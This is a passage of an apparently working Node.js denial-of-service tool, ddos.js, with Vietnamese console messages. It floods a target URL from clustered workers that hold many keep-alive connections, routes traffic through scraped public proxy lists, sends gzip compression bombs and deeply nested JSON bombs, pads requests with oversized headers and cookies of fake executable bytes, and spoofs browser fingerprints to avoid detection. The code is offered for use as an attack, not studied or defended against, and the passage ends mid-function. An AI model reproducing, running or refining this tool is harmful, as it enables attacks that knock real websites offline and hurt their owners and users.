#!/usr/bin/env node

const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const path = require('path');
const readline = require('readline');
const https = require('https');
const http = require('http');
const zlib = require('zlib');
const gradient = require('gradient-string');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { HttpProxyAgent } = require('http-proxy-agent');
const { SocksProxyAgent } = require('socks-proxy-agent');

if (cluster.isMaster) {
    const args = process.argv.slice(2);
    
    const noProxyMode = args.includes('--noproxy');
    const burstMode = args.includes('--burst');
    const ultraMode = args.includes('--ultra');
    
    const effectiveArgs = args.filter(arg => !arg.startsWith('--'));
    
    const [urlTarget, numberOfRequest, delay, worker, numberOfTcp] = effectiveArgs;

    if (!urlTarget || !numberOfRequest || !delay || !worker || !numberOfTcp) {
        console.log(gradient.rainbow('❌ Cách dùng: node ddos.js [url mục tiêu] [số request] [độ trễ] [số worker] [số TCP/worker] [--noproxy] [--burst] [--ultra]'));
        console.log(gradient.rainbow('📝 Ví dụ: node ddos.js https://example.com 10000 5 8 50'));
        console.log(gradient.rainbow('📝 Không dùng proxy: node ddos.js https://example.com 10000 5 8 50 --noproxy'));
        console.log(gradient.rainbow('💥 Chế độ burst: node ddos.js https://example.com 10000 5 8 50 --burst'));
        console.log(gradient.rainbow('⚡ Chế độ ultra: node ddos.js https://example.com 10000 5 8 50 --ultra'));
        process.exit(1);
    }

    const target = urlTarget;
    const totalRequests = parseInt(numberOfRequest, 10) * 2; // Double the request load
    const delayMs = Math.max(0, parseInt(delay, 10) / 2); // Reduce delay for faster attacks
    const numWorkers = parseInt(worker, 10) * 2; // Double the workers
    const tcpConnections = parseInt(numberOfTcp, 10) * 2; // Double TCP connections per worker

    if (isNaN(totalRequests) || totalRequests <= 0) {
        console.log(gradient.rainbow('❌ Số request phải là số dương!'));
        process.exit(1);
    }
    
    if (isNaN(delayMs) || delayMs < 0) {
        console.log(gradient.rainbow('❌ Độ trễ phải >= 0!'));
        process.exit(1);
    }
    
    if (isNaN(numWorkers) || numWorkers <= 0) {
        console.log(gradient.rainbow('❌ Số worker phải là số dương!'));
        process.exit(1);
    }
    
    if (isNaN(tcpConnections) || tcpConnections <= 0) {
        console.log(gradient.rainbow('❌ Số TCP/worker phải là số dương!'));
        process.exit(1);
    }

    try {
        new URL(target);
    } catch {
        console.log(gradient.rainbow('❌ URL mục tiêu không hợp lệ!'));
        process.exit(1);
    }

    let proxies = [];
    let successfulRequests = 0;
    let workers = [];

    console.clear();

    async function fetchProxies() {
        const urls = [
            'https://raw.githubusercontent.com/arondeptraivll/ddos-website/refs/heads/main/proxies.txt',
            'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
            'https://api.proxyscrape.com/v4/free-proxy-list/get?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all&skip=0&limit=5000', // Increased limit
            'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt'
        ];

        async function fetchFrom(url) {
            return new Promise((resolve) => {
                const getter = url.startsWith('https') ? https : http;
                getter.get(url, { timeout: 5000 }, (res) => {
                    let data = '';
                    res.on('data', chunk => data += chunk);
                    res.on('end', () => {
                        const list = data.split(/\r?\n/)
                            .map(line => line.trim())
                            .filter(Boolean);
                        resolve(list);
                    });
                }).on('error', () => resolve([]))
                .on('timeout', () => resolve([]));
            });
        }

        const results = await Promise.all(urls.map(u => fetchFrom(u)));
        const proxies = Array.from(new Set(results.flat()));
        return proxies;
    }

    function createProgressBar(current, total, barLength = 40) {
        const percentage = Math.floor((current / total) * 100);
        const filledLength = Math.floor((current / total) * barLength);
        const emptyLength = barLength - filledLength;
        
        const filled = '█'.repeat(filledLength);
        const empty = '░'.repeat(emptyLength);
        
        return `${filled}${empty}`;
    }

    async function showInitProgress() {
        return new Promise((resolve) => {
            let current = 0;
            const total = numWorkers;
            
            const interval = setInterval(() => {
                const bar = createProgressBar(current, total);
                const percentage = Math.floor((current / total) * 100);
                
                process.stdout.clearLine();
                process.stdout.cursorTo(0);
                process.stdout.write(
                    gradient.rainbow(`⚡ Đang khởi tạo cluster ${current}/${total} (${tcpConnections} TCP/worker) `) +
                    gradient.rainbow(`[${bar}] ${percentage}%`)
                );
                
                current++;
                if (current > total) {
                    clearInterval(interval);
                    process.stdout.clearLine();
                    process.stdout.cursorTo(0);
                    console.log(gradient.rainbow(`✨ Khởi tạo hoàn tất! Tổng ${numWorkers * tcpConnections} kết nối TCP`));
                    resolve();
                }
            }, 50); // Faster progress update
        });
    }

    function checkCompletion() {
        if (successfulRequests >= totalRequests) {
            console.log(gradient.rainbow(`\n🎯 Hoàn thành ${totalRequests} requests thành công!`));
            
            workers.forEach(worker => worker.kill());
            process.exit(0);
        }
    }

    async function main() {
        console.log(gradient.rainbow('🚀 Cấu hình tấn công:'));
        console.log(gradient.rainbow(`   🎯 Mục tiêu: ${target}`));
        console.log(gradient.rainbow(`   📊 Số request: ${totalRequests}`));
        console.log(gradient.rainbow(`   ⏱️ Độ trễ: ${delayMs}ms`));
        console.log(gradient.rainbow(`   👥 Workers: ${numWorkers}`));
        console.log(gradient.rainbow(`   🔗 TCP/Worker: ${tcpConnections}`));
        console.log(gradient.rainbow(`   💥 Tổng TCP: ${numWorkers * tcpConnections}`));
        console.log(gradient.rainbow(`   🌐 Chế độ: ${noProxyMode ? 'KẾT NỐI TRỰC TIẾP' : 'CHẾ ĐỘ PROXY'}`));
        console.log(gradient.rainbow(`   💥 Chế độ burst: ${burstMode ? 'BẬT' : 'TẮT'}`));
        console.log(gradient.rainbow(`   ⚡ Chế độ ultra: ${ultraMode ? 'BẬT' : 'TẮT'}\n`));

        if (!noProxyMode) {
            console.log(gradient.rainbow('📡 Đang tải danh sách proxy...'));
            proxies = await fetchProxies();
            console.log(gradient.rainbow(`✅ Đã tải ${proxies.length} proxy\n`));
        } else {
            console.log(gradient.rainbow('🎯 Chế độ kết nối trực tiếp\n'));
        }

        await showInitProgress();
        console.clear();
        
        for (let i = 0; i < numWorkers; i++) {
            const worker = cluster.fork();

            worker.on('online', () => {
                worker.send({
                    type: 'init',
                    config: {
                        workerId: i + 1,
                        target: target,
                        delayMs: delayMs,
                        proxies: proxies,
                        totalTarget: totalRequests,
                        tcpConnections: tcpConnections,
                        noProxyMode: noProxyMode,
                        burstMode: burstMode,
                        ultraMode: ultraMode,
                        burstSize: ultraMode ? 1000 : 200 // Increased burst size
                    }
                });
            });

            worker.on('message', (data) => {
                if (data.type === 'response') {
                    successfulRequests++;
                    console.log(data.message);
                    checkCompletion();
                }
            });

            workers.push(worker);
        }

        cluster.on('exit', (worker, code, signal) => {
            if (code !== 0 && !worker.exitedAfterDisconnect) {
                const newWorker = cluster.fork();
                
                newWorker.on('online', () => {
                    newWorker.send({
                        type: 'init',
                        config: {
                            workerId: workers.length + 1,
                            target: target,
                            delayMs: delayMs,
                            proxies: proxies,
                            totalTarget: totalRequests,
                            tcpConnections: tcpConnections,
                            noProxyMode: noProxyMode,
                            burstMode: burstMode,
                            ultraMode: ultraMode,
                            burstSize: ultraMode ? 1000 : 200
                        }
                    });
                });

                workers.push(newWorker);
            }
        });
    }

    main().catch(error => {
        console.error('Lỗi master:', error);
        process.exit(1);
    });

} else {
    let config = null;

    const sleep = ms => new Promise(res => setTimeout(res, ms));

    function randomItem(arr) {
        return arr[Math.floor(Math.random() * arr.length)];
    }

    function randomMethod() {
        return Math.random() < 0.6 ? 'GET' : 'POST'; // Slightly more POST for heavier load
    }

    class MagicBagFactory {
        static createMagicBag(type = 'auto', sizeLevel = 'medium') {
            if (type === 'auto') {
                type = randomItem(['text', 'json', 'xml', 'binary', 'super']);
            }

            switch (type) {
                case 'text':
                    return this.createTextBomb(sizeLevel);
                case 'json': 
                    return this.createJsonBomb(sizeLevel);
                case 'xml':
                    return this.createXmlBomb(sizeLevel);
                case 'binary':
                    return this.createBinaryBomb(sizeLevel);
                case 'super':
                    return this.createSuperMagicBag(sizeLevel);
                default:
                    return this.createTextBomb(sizeLevel);
            }
        }

        static getSizeMultiplier(sizeLevel) {
            switch (sizeLevel) {
                case 'small': return 0.5;
                case 'medium': return 1.0;
                case 'large': return 2.5;
                case 'extreme': return 10.0; // Increased for extreme load
                default: return 1.0;
            }
        }

        static createTextBomb(sizeLevel = 'medium') {
            const multiplier = this.getSizeMultiplier(sizeLevel);
            const repeatCount = Math.floor(250000 * multiplier); // Increased size
            
            const hugeSameText = 'OPTIMIZED_PAYLOAD_'.repeat(repeatCount);
            
            try {
                const compressed = zlib.gzipSync(hugeSameText, { level: 9 });
                
                return {
                    bagContents: compressed,
                    bagSize: compressed.length,
                    realSize: hugeSameText.length,
                    explosionRatio: Math.floor(hugeSameText.length / compressed.length),
                    type: 'text_bomb',
                    sizeLevel: sizeLevel,
                    encoding: 'gzip'
                };
            } catch (error) {
                return this.createSimpleTextBomb();
            }
        }

        static createJsonBomb(sizeLevel = 'medium') {
            const multiplier = this.getSizeMultiplier(sizeLevel);
            const studentCount = Math.floor(50000 * multiplier); // Increased size
            
            const hugeJsonData = {
                school: "Optimized School",
                year: 2025,
                semester: "Spring",
                students: Array(studentCount).fill({
                    name: "Nguyen Van Optimized",
                    class: "4A Advanced Payload",
                    homework: "Complex Data Compression",
                    score: 10,
                    attendance: "Perfect",
                    subjects: ["Math", "Science", "AI", "Cryptography"],
                    activities: ["Robotics", "Chess", "AI Club"]
                }),
                metadata: {
                    compressionType: "gzip",
                    originalSize: "calculated_after_creation",
                    explosionRatio: "calculated_after_compression"
                }
            };
            
            try {
                const jsonString = JSON.stringify(hugeJsonData);
                const compressed = zlib.gzipSync(jsonString, { level: 9 });
                
                return {
                    bagContents: compressed,
                    bagSize: compressed.length,
                    realSize: jsonString.length,
                    explosionRatio: Math.floor(jsonString.length / compressed.length),
                    type: 'json_bomb',
                    sizeLevel: sizeLevel,
                    encoding: 'gzip'
                };
            } catch (error) {
                return this.createSimpleJsonBomb();
            }
        }

        static createXmlBomb(sizeLevel = 'medium') {
            const multiplier = this.getSizeMultiplier(sizeLevel);
            const studentCount = Math.floor(60000 * multiplier); // Increased size
            
            let hugeXml = '<?xml version="1.0" encoding="UTF-8"?>\n<optimized_school>\n<metadata>\n<compression>gzip</compression>\n<type>xml_bomb</type>\n</metadata>\n<students>\n';
            
            for (let i = 0; i < studentCount; i++) {
                hugeXml += `<student id="${i}">
                    <name>Nguyen Van Optimized ${i % 100}</name>
                    <class>4A Advanced XML</class>
                    <age>8</age>
                    <homework>Complex XML Processing</homework>
                    <score>10</score>
                    <attendance>Perfect</attendance>
                    <subjects>
                        <subject>Mathematics</subject>
                        <subject>AI</subject>
                        <subject>Cryptography</subject>
                    </subjects>
                </student>\n`;
            }
            hugeXml += '</students>\n</optimized_school>';
            
            try {
                const compressed = zlib.gzipSync(hugeXml, { level: 9 });
                
                return {
                    bagContents: compressed,
                    bagSize: compressed.length,
                    realSize: hugeXml.length,
                    explosionRatio: Math.floor(hugeXml.length / compressed.length),
                    type: 'xml_bomb',
                    sizeLevel: sizeLevel,
                    encoding: 'gzip'
                };
            } catch (error) {
                return this.createSimpleXmlBomb();
            }
        }

        static createBinaryBomb(sizeLevel = 'medium') {
            const multiplier = this.getSizeMultiplier(sizeLevel);
            const patternCount = Math.floor(200000 * multiplier); // Increased size
            
            const magicPattern = Buffer.from([
                0x4F, 0x50, 0x54, 0x49, 0x4D,
                0x49, 0x5A, 0x45, 0x44,      
                0x50, 0x41, 0x59, 0x4C, 0x4F, 0x41, 0x44,
                0x00, 0x00, 0x00, 0x00
            ]);
            
            const hugeBinary = Buffer.concat(Array(patternCount).fill(magicPattern));
            
            try {
                const compressed = zlib.gzipSync(hugeBinary, { level: 9 });
                
                return {
                    bagContents: compressed,
                    bagSize: compressed.length,
                    realSize: hugeBinary.length,
                    explosionRatio: Math.floor(hugeBinary.length / compressed.length),
                    type: 'binary_bomb',
                    sizeLevel: sizeLevel,
                    encoding: 'gzip'
                };
            } catch (error) {
                return this.createSimpleBinaryBomb();
            }
        }

        static createSuperMagicBag(sizeLevel = 'medium') {
            const multiplier = this.getSizeMultiplier(sizeLevel);
            
            const level1 = this.createTextBomb(sizeLevel);
            const level1String = level1.bagContents.toString('base64').repeat(Math.floor(2000 * multiplier)); // Increased nesting
            
            try {
                const level2Compressed = zlib.gzipSync(level1String, { level: 9 });
                
                return {
                    bagContents: level2Compressed,
                    bagSize: level2Compressed.length,
                    realSize: level1String.length,
                    explosionRatio: Math.floor(level1String.length / level2Compressed.length),
                    type: 'super_bomb',
                    sizeLevel: sizeLevel,
                    encoding: 'gzip',
                    warning: 'NESTED_COMPRESSION_BOMB'
                };
            } catch (error) {
                return this.createTextBomb(sizeLevel);
            }
        }

        static createSimpleTextBomb() {
            const simpleText = 'OPTIMIZED'.repeat(20000); // Increased size
            return {
                bagContents: Buffer.from(simpleText),
                bagSize: simpleText.length,
                realSize: simpleText.length,
                explosionRatio: 1,
                type: 'simple_text',
                encoding: 'none'
            };
        }

        static createSimpleJsonBomb() {
            const simpleJson = JSON.stringify({ bomb: 'OPTIMIZED'.repeat(10000) }); // Increased size
            return {
                bagContents: Buffer.from(simpleJson),
                bagSize: simpleJson.length,
                realSize: simpleJson.length,
                explosionRatio: 1,
                type: 'simple_json',
                encoding: 'none'
            };
        }

        static createSimpleXmlBomb() {
            const simpleXml = `<?xml version="1.0"?><bomb>${'OPTIMIZED'.repeat(10000)}</bomb>`; // Increased size
            return {
                bagContents: Buffer.from(simpleXml),
                bagSize: simpleXml.length,
                realSize: simpleXml.length,
                explosionRatio: 1,
                type: 'simple_xml',
                encoding: 'none'
            };
        }

        static createSimpleBinaryBomb() {
            const simpleBinary = Buffer.from('OPTIMIZED'.repeat(10000)); // Increased size
            return {
                bagContents: simpleBinary,
                bagSize: simpleBinary.length,
                realSize: simpleBinary.length,
                explosionRatio: 1,
                type: 'simple_binary',
                encoding: 'none'
            };
        }
    }

    class AdaptiveStealthEngine {
        constructor(config) {
            this.totalRAM = os.totalmem();
            this.freeRAM = os.freemem();
            this.cpuCount = os.cpus().length;
            this.platform = os.platform();
            this.ultraMode = config.ultraMode || false;
            
            this.calculateOptimalSizes();
            this.memoryPressure = 0;
            this.startMemoryMonitoring();
        }

        calculateOptimalSizes() {
            const totalRAM_GB = this.totalRAM / (1024 * 1024 * 1024);
            const freeRAM_GB = this.freeRAM / (1024 * 1024 * 1024);
            
            if (totalRAM_GB >= 16) {
                this.maxHeaderSize = this.ultraMode ? 32768 : 16384; // Doubled
                this.maxJsonDepth = this.ultraMode ? 400 : 200;
                this.maxArraySize = this.ultraMode ? 600 : 300;
                this.maxBinaryChunk = this.ultraMode ? 4096 : 2048;
                this.headerCount = this.ultraMode ? 100 : 50;
                this.compressionLevel = 'extreme';
            } else if (totalRAM_GB >= 8) {
                this.maxHeaderSize = this.ultraMode ? 16384 : 8192;
                this.maxJsonDepth = this.ultraMode ? 200 : 120;
                this.maxArraySize = this.ultraMode ? 300 : 200;
                this.maxBinaryChunk = this.ultraMode ? 2048 : 1024;
                this.headerCount = this.ultraMode ? 50 : 30;
                this.compressionLevel = 'large';
            } else if (totalRAM_GB >= 4) {
                this.maxHeaderSize = this.ultraMode ? 8192 : 4096;
                this.maxJsonDepth = this.ultraMode ? 120 : 80;
                this.maxArraySize = this.ultraMode ? 200 : 150;
                this.maxBinaryChunk = this.ultraMode ? 1024 : 512;
                this.headerCount = this.ultraMode ? 30 : 20;
                this.compressionLevel = 'medium';
            } else {
                this.maxHeaderSize = 2048;
                this.maxJsonDepth = 60;
                this.maxArraySize = 100;
                this.maxBinaryChunk = 256;
                this.headerCount = 20;
                this.compressionLevel = 'small';
            }

            const freeRAMRatio = freeRAM_GB / totalRAM_GB;
            if (freeRAMRatio < 0.2) {
                this.scaleDown(0.5);
            } else if (freeRAMRatio < 0.4) {
                this.scaleDown(0.75);
            }
        }

        scaleDown(factor) {
            this.maxHeaderSize = Math.floor(this.maxHeaderSize * factor);
            this.maxJsonDepth = Math.floor(this.maxJsonDepth * factor);
            this.maxArraySize = Math.floor(this.maxArraySize * factor);
            this.maxBinaryChunk = Math.floor(this.maxBinaryChunk * factor);
            this.headerCount = Math.floor(this.headerCount * factor);
            
            if (factor < 0.6) {
                this.compressionLevel = 'small';
            } else if (factor < 0.8) {
                this.compressionLevel = 'medium';
            }
        }

        startMemoryMonitoring() {
            setInterval(() => {
                const currentFree = os.freemem();
                const freeRatio = currentFree / this.totalRAM;
                
                if (freeRatio < 0.15) {
                    this.memoryPressure = 3;
                    this.compressionLevel = 'small';
                    this.scaleDown(0.6);
                } else if (freeRatio < 0.25) {
                    this.memoryPressure = 2;
                    this.compressionLevel = 'medium';
                    this.scaleDown(0.8);
                } else if (freeRatio < 0.4) {
                    this.memoryPressure = 1;
                    this.scaleDown(0.9);
                } else {
                    this.memoryPressure = 0;
                    this.calculateOptimalSizes();
                }
            }, 2000); // Faster monitoring
        }

        generateExecutableBinary(length) {
            const executablePatterns = [
                [0x4D, 0x5A, 0x90, 0x00],
                [0x50, 0x45, 0x00, 0x00],
                [0x0E, 0x1F, 0xBA, 0x0E],
                [0x48, 0x89, 0xE5],
                [0x48, 0x83, 0xEC],
                [0x48, 0x8B, 0x45],
                [0xC3],
                [0x90],
                [0xCC],
                [0x48, 0x31, 0xC0],
                [0xFF, 0xD0],
                [0x00, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x00],
                [0x00, 0x2E, 0x64, 0x61, 0x74, 0x61, 0x00],
                [0x00, 0x2E, 0x72, 0x64, 0x61, 0x74, 0x61],
                [0xDE, 0xAD, 0xBE, 0xEF],
                [0xCA, 0xFE, 0xBA, 0xBE],
                [0xFE, 0xED, 0xFA, 0xCE],
            ];

            let result = [];
            
            for (let i = 0; i < length; i++) {
                if (Math.random() < 0.4) { // Increased pattern frequency
                    const pattern = randomItem(executablePatterns);
                    result.push(...pattern);
                    i += pattern.length - 1;
                } else if (Math.random() < 0.7) {
                    result.push(32 + Math.floor(Math.random() * 95));
                } else if (Math.random() < 0.9) {
                    result.push(0);
                } else {
                    result.push(Math.floor(Math.random() * 256));
                }
            }

            return Buffer.from(result).toString('base64');
        }

        generateDisassemblyHex(length) {
            const opcodes = [
                '48894500', '4883EC20', '488B4508', 'C3909090',
                '4831C048', 'FFD04889', 'E5488365', 'FC004883',
                'EC204889', '7DF84889', '75F0488B', '45F8488B',
                '55F04801', 'D0488945', 'E8488B45', 'E8C9C390',
                'DEADBEEF', 'CAFEBABE', 'FEEDFACE', '13371337'
            ];

            let result = '';
            while (result.length < length) {
                if (Math.random() < 0.8) { // Increased opcode frequency
                    result += randomItem(opcodes);
                } else {
                    result += Math.floor(Math.random() * 16).toString(16);
                }
            }
            return result.substring(0, length);
        }

        generateCorruptedUnicode(length) {
            const ranges = [
                [0x0000, 0x001F],
                [0x007F, 0x009F],
                [0x2000, 0x206F],
                [0x2070, 0x209F],
                [0x20A0, 0x20CF],
                [0x2100, 0x214F],
                [0xFFF0, 0xFFFF],
            ];

            let result = '';
            for (let i = 0; i < length; i++) {
                if (Math.random() < 0.5) { // Increased corrupted char frequency
                    const range = randomItem(ranges);
                    const char = String.fromCharCode(
                        Math.floor(Math.random() * (range[1] - range[0] + 1)) + range[0]
                    );
                    result += char;
                } else {
                    result += String.fromCharCode(32 + Math.floor(Math.random() * 95));
                }
            }
            return result;
        }

        generateAdaptiveHeaders() {
            const headers = {};
            
            const actualHeaderCount = Math.max(10, this.headerCount - (this.memoryPressure * 10)); // Doubled base count
            
            for (let i = 0; i < actualHeaderCount; i++) {
                const chunkSize = Math.max(128, this.maxBinaryChunk - (this.memoryPressure * 128)); // Doubled base size
                
                headers[`X-Optimized-Exec-${i}`] = this.generateExecutableBinary(chunkSize);
                headers[`X-Optimized-Disasm-${i}`] = this.generateDisassemblyHex(chunkSize);
                headers[`X-Optimized-Corrupt-${i}`] = this.generateCorruptedUnicode(Math.floor(chunkSize * 0.7));
            }

            const largeHeaderSize = Math.max(512, this.maxHeaderSize - (this.memoryPressure * 1024)); // Doubled base size
            headers['X-Optimized-Binary'] = this.generateExecutableBinary(largeHeaderSize);
            headers['X-Optimized-Hex'] = this.generateDisassemblyHex(largeHeaderSize);
            
            const cookieSize = Math.max(20, 30 - (this.memoryPressure * 20)); // Doubled base size
            headers['Cookie'] = Array(cookieSize).fill().map((_, i) => 
                `opt_${i}=${this.generateExecutableBinary(256)}` // Doubled chunk size
            ).join('; ');

            return headers;
        }

        generateAdaptiveJsonBomb() {
            const actualDepth = Math.max(20, this.maxJsonDepth - (this.memoryPressure * 40)); // Doubled base depth
            const actualArraySize = Math.max(40, this.maxArraySize - (this.memoryPressure * 100)); // Doubled base size
            const chunkSize = Math.max(64, this.maxBinaryChunk - (this.memoryPressure * 128)); // Doubled base size

            const bomb = {
                meta: {
                    execSignature: this.generateExecutableBinary(chunkSize),
                    disassembly: this.generateDisassemblyHex(chunkSize),
                    corruption: this.generateCorruptedUnicode(Math.floor(chunkSize * 0.6))
                },
                deepNest: {},
                binaryArray: Array(actualArraySize).fill().map((_, i) => ({
                    id: i,
                    execChunk: this.generateExecutableBinary(Math.floor(chunkSize * 0.8)),
                    hexChunk: this.generateDisassemblyHex(Math.floor(chunkSize * 0.6)),
                    corruptChunk: this.generateCorruptedUnicode(Math.floor(chunkSize * 0.4))
                }))
            };

            let current = bomb.deepNest;
            for (let i = 0; i < actualDepth; i++) {
                current.level = i;
                current.execData = this.generateExecutableBinary(Math.floor(chunkSize * 0.6));
                current.nested = {};
                current = current.nested;
            }

            return JSON.stringify(bomb);
        }

        getCompressionLevel() {
            return this.compressionLevel;
        }
    }

    class RandomFingerprint {
        static generate() {
            const browsers = [
                {
                    name: 'Chrome',
                    versions: ['124.0.0.0', '125.0.0.0', '126.0.0.0'],
                    os: ['Windows NT 10.0; Win64; x64', 'Macintosh; Intel Mac OS X 14_0', 'X11; Linux x86_64']
                },
                {
                    name: 'Firefox', 
                    versions: ['123.0', '124.0', '125.0'],
                    os: ['Windows NT 10.0; Win64; x64', 'Macintosh', 'X11; Ubuntu; Linux x86_64']
                },
                {
                    name: 'Safari',
                    versions: ['17.2', '17.3', '17.4'],
                    os: ['Macintosh; Intel Mac OS X 14_0', 'iPhone; CPU iPhone OS 17_0 like Mac OS X']
                },
                {
                    name: 'Edge',
                    versions: ['124.0.0.0', '125.0.0.0', '126.0.0.0'],
                    os: ['Windows NT 10.0; Win64; x64']
                }
            ];

            const browser = randomItem(browsers);
            const version = randomItem(browser.versions);
            const os = randomItem(browser.os);
            const isMobile = os.includes('iPhone') || Math.random() < 0.2;

            return {
                userAgent: this.buildUserAgent(browser.name, version, os),
                language: randomItem([
                    'en-US,en;q=0.9', 'en-GB,en;q=0.9', 'vi-VN,vi;q=0.9,en;q=0.8',
                    'fr-FR,fr;q=0.9,en;q=0.8', 'de-DE,de;q=0.9,en;q=0.8',
                    'es-ES,es;q=0.9,en;q=0.8', 'ja-JP,ja;q=0.9,en;q=0.8',
                    'ko-KR,ko;q=0.9,en;q=0.8', 'zh-CN,zh;q=0.9,en;q=0.8',
                    'ru-RU,ru;q=0.9,en;q=0.8'
                ]),
                encoding: randomItem([
                    'gzip, deflate, br', 'gzip, deflate', 'br',
                    'gzip, deflate, br, zstd', 'identity'
                ]),
                platform: os,
                mobile: isMobile
            };
        }

        static buildUserAgent(browser, version, os) {
            switch (browser) {
                case 'Chrome':
                    return `Mozilla/5.0 (${os}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version} Safari/537.36`;
                case 'Firefox':
                    return `Mozilla/5.0 (${os}; rv:${version}) Gecko/20100101 Firefox/${version}`;
                case 'Safari':
                    if (os.includes('iPhone')) {
                        return `Mozilla/5.0 (${os}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version} Mobile/15E148 Safari/604.1`;
                    }
                    return `Mozilla/5.0 (${os}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${version} Safari/605.1.15`;
                case 'Edge':
                    return `Mozilla/5.0 (${os}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version} Safari/537.36 Edg/${version}`;
                default:
                    return `Mozilla/5.0 (${os}) AppleWebKit/537.36`;
            }
        }

        static generateAdvancedHeaders(fingerprint, method) {
            const headers = {
                'User-Agent': fingerprint.userAgent,
                'Accept-Language': fingerprint.language,
                'Accept-Encoding': fingerprint.encoding,
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            };

            if (method === 'GET') {
                headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8';
                headers['Sec-Fetch-Mode'] = randomItem(['navigate', 'cors', 'no-cors']);
                headers['Sec-Fetch-Site'] = randomItem(['none', 'same-origin', 'cross-site']);
                headers['Sec-Fetch-Dest'] = 'document';
            } else if (method === 'POST') {
                headers['Accept'] = 'application/json, text/plain, */*';
                headers['Sec-Fetch-Mode'] = 'cors';
                headers['Sec-Fetch-Site'] = 'same-origin';
                headers['Sec-Fetch-Dest'] = 'empty';
            }

            if (Math.random() > 0.5) {
                headers['Cache-Control'] = randomItem(['no-cache', 'max-age=0', 'no-store']);
            }

            if (Math.random() > 0.3) {
                headers['Referer'] = randomItem([
                    'https://www.google.com/', 'https://www.bing.com/',
                    'https://duckduckgo.com/', 'https://www.facebook.com/',
                    'https://x.com/', 'https://www.youtube.com/'
                ]);
            }

            return headers;
        }
    }

    class AttackRotation {
        static getRandomAttackVector() {
            const vectors = [
                'compression_bomb',
                'json_bomb',
                'header_overflow',
                'binary_bomb',
                'simple_payload',
                'mixed_payload'
            ];
            
            const weights = [30, 30, 20, 10, 5, 5]; // Adjusted for more aggressive vectors
            const total = weights.reduce((a, b) => a + b, 0);
            let random = Math.random() * total;
            
            for (let i = 0; i < weights.length; i++) {
                random -= weights[i];
                if (random <= 0) {
                    return vectors[i];
                }
            }
            
            return 'compression_bomb';
        }
    }

    function stealthHeaders(method, attackVector = 'auto') {
        const fingerprint = RandomFingerprint.generate();
        let headers = RandomFingerprint.generateAdvancedHeaders(fingerprint, method);
        
        if (attackVector === 'header_overflow' || Math.random() < 0.6) { // Increased frequency
            const stealthHeaders = stealthEngine.generateAdaptiveHeaders();
            headers = { ...headers, ...stealthHeaders };
        }
        
        if (method === 'POST') {
            if (attackVector === 'compression_bomb') {
                headers['Content-Encoding'] = 'gzip';
            }
        }

        const shuffledHeaders = {};
        const keys = Object.keys(headers).sort(() => Math.random() - 0.5);
        keys.forEach(key => shuffledHeaders[key] = headers[key]);

        return shuffledHeaders;
    }

    function createPersistentAgent(proxyUrl, target) {
        if (!proxyUrl) {
            return target.startsWith('https') 
                ? new https.Agent({ 
                    keepAlive: true, 
                    keepAliveMsecs: 10000, // Faster keep-alive
                    maxSockets: Infinity,
                    maxFreeSockets: 50 // Increased free sockets
                })
                : new http.Agent({ 
                    keepAlive: true, 
                    keepAliveMsecs: 10000,
                    maxSockets: Infinity,
                    maxFreeSockets: 50
                });
        }

        try {
            const urlObj = new URL(proxyUrl.includes('://') ? proxyUrl : `http://${proxyUrl}`);
            const protocol = urlObj.protocol.replace(':', '');

            switch (protocol) {
                case 'http':
                    return new HttpProxyAgent(proxyUrl, { 
                        keepAlive: true, keepAliveMsecs: 10000,
                        maxSockets: Infinity, maxFreeSockets: 50
                    });
                case 'https':
                    return new HttpsProxyAgent(proxyUrl, { 
                        keepAlive: true, keepAliveMsecs: 10000,
                        maxSockets: Infinity, maxFreeSockets: 50
                    });
                case 'socks':
                case 'socks4':
                case 'socks5':
                    return new SocksProxyAgent(proxyUrl);
                default:
                    if (!isNaN(parseInt(urlObj.port))) {
                        return new HttpProxyAgent(`http://${urlObj.host}`, { 
                            keepAlive: true, keepAliveMsecs: 10000,
                            maxSockets: Infinity, maxFreeSockets: 50
                        });
                    }
                    return null;
            }
        } catch {
            return null;
        }
    }

    class SocketManager {
        constructor(config) {
            this.config = config;
            this.sockets = [];
            this.requestCount = 0;
            
            if (!stealthEngine) {
                stealthEngine = new AdaptiveStealthEngine(config);
            }
            
            this.initializeSockets();
        }

        initializeSockets() {
            const { proxies, tcpConnections, workerId, noProxyMode } = this.config;
            
            for (let i = 0; i < tcpConnections; i++) {
                let proxy = null;
                
                if (!noProxyMode && proxies.length > 0) {
                    const proxyIndex = ((workerId - 1) * tcpConnections + i) % proxies.length;
                    proxy = proxies[proxyIndex];
                }
                
                const socket = new PersistentSocket({
                    ...this.config,
                    socketId: i + 1,
                    proxy: proxy,
                    manager: this
                });
                
                this.sockets.push(socket);
            }
        }

        reportResponse(message) {
            this.requestCount++;
            process.send({
                type: 'response',
                message: message
            });
        }
    }

    class PersistentSocket {
        constructor(config) {
            this.config = config;
            this.proxy = config.proxy;
            this.socketId = config.socketId;
            this.manager = config.manager;
            this.agent = null;
            this.consecutiveErrors = 0;
            this.maxErrors = 5; // Reduced to retry faster
            this.localRequestCount = 0;
            this.isEstablishing = false;
            
            this.establishConnection();
        }

        async establishConnection() {
            if (this.isEstablishing) return;
            this.isEstablishing = true;

            this.agent = createPersistentAgent(this.proxy, this.config.target);
            const testResult = await this.testConnection();
            
            if (testResult) {
                this.consecutiveErrors = 0;
                this.isEstablishing = false;
                this.startSpamming();
            } else {
                if (this.config.noProxyMode) {
                    await sleep(250); // Faster retry
                    this.establishConnection();
                } else {
                    await this.switchProxy();
                }
            }
        }

        async switchProxy() {
            const { proxies } = this.config;
            let attempts = 0;
            
            while (attempts < proxies.length && attempts < 3) {
                const nextIndex = (Math.floor(Math.random() * proxies.length));
                this.proxy = proxies[nextIndex];
                this.agent = createPersistentAgent(this.proxy, this.config.target);
                
                const testResult = await this.testConnection();
                if (testResult) {
                    this.consecutiveErrors = 0;
